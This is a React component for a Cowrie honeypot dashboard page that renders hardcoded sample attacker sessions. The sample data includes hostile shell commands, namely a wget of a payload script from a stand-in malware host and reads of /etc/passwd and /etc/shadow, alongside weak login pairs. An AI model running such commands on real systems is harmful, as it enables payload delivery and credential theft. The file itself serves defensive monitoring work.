import React from 'react';
import { motion } from 'framer-motion';
import { Bug, AlertTriangle } from 'lucide-react';

const SESSIONS = [
  { time:'62m ago', src:'198.51.100.23', country:'RO', user:'root',  pass:'password', cmds:['whoami','cat /etc/passwd','wget http://malware.example.com/payload.sh'] },
  { time:'3h ago',  src:'45.33.32.156',  country:'US', user:'admin', pass:'admin',    cmds:['uname -a','ls -la /','id']                                              },
  { time:'5h ago',  src:'203.0.113.78',  country:'BR', user:'root',  pass:'123456',   cmds:['cat /etc/shadow','ps aux']                                              },
];

export default function Honeypot() {
  return (
    <motion.div key="honeypot"
      initial={{ opacity:0, y:10 }} animate={{ opacity:1, y:0 }}
      exit={{ opacity:0 }} transition={{ duration:0.25 }}
    >
      <div style={{ marginBottom:24 }}>
        <h1 style={{ fontSize:22, fontWeight:700, color:'#e8f4ff', margin:0,
          display:'flex', alignItems:'center', gap:10 }}>
          <Bug size={20} color="#00e5ff" /> Cowrie Honeypot
        </h1>
        <div style={{ fontSize:13, color:'#3d5080', marginTop:4 }}>
          SSH/Telnet deception · Port 2222/2323 · 192.168.56.10 · Wazuh rule 100017
        </div>
      </div>

      <div style={{ display:'grid', gridTemplateColumns:'repeat(4,1fr)', gap:12, marginBottom:22 }}>
        {[
          { label:'Total Sessions',  value:7,  color:'#00e5ff' },
          { label:'Unique IPs',      value:4,  color:'#ff8c00' },
          { label:'Commands Logged', value:18, color:'#ffd600' },
          { label:'Payloads Caught', value:2,  color:'#ff2d6d' },
        ].map(s => (
          <div key={s.label} className="glass-card" style={{ padding:'14px 16px' }}>
            <div style={{ fontFamily:'JetBrains Mono,monospace', fontSize:26,
              fontWeight:700, color:s.color }}>{s.value}</div>
            <div style={{ fontSize:11.5, color:'#3d5080', marginTop:3 }}>{s.label}</div>
          </div>
        ))}
      </div>

      <div style={{ fontSize:14, fontWeight:600, color:'#e8f4ff', marginBottom:12 }}>
        Captured Attacker Sessions
      </div>

      <div style={{ display:'flex', flexDirection:'column', gap:12 }}>
        {SESSIONS.map((s, i) => (
          <motion.div key={i} className="glass-card"
            style={{ padding:'16px 18px', borderLeft:'3px solid #ff2d6d' }}
            initial={{ opacity:0, y:8 }} animate={{ opacity:1, y:0 }}
            transition={{ delay: i * 0.07 }}
          >
            <div style={{ display:'flex', justifyContent:'space-between',
              marginBottom:10, alignItems:'flex-start' }}>
              <div>
                <span style={{ fontFamily:'JetBrains Mono,monospace',
                  fontSize:13, color:'#ff8c00' }}>{s.src}</span>
                <span style={{ fontSize:11.5, color:'#3d5080', marginLeft:10 }}>
                  {s.country} · {s.time}
                </span>
              </div>
              <div style={{ fontSize:11.5, color:'#6b7fa3' }}>
                {s.user} / {s.pass}
              </div>
            </div>
            <div style={{ display:'flex', flexDirection:'column', gap:4 }}>
              {s.cmds.map(cmd => (
                <div key={cmd} style={{
                  fontFamily:'JetBrains Mono,monospace', fontSize:11.5,
                  color:'#00e5ff', background:'rgba(0,0,0,0.3)',
                  border:'1px solid #1a2744', borderRadius:4,
                  padding:'5px 10px',
                }}>
                  $ {cmd}
                </div>
              ))}
            </div>
          </motion.div>
        ))}
      </div>
    </motion.div>
  );
}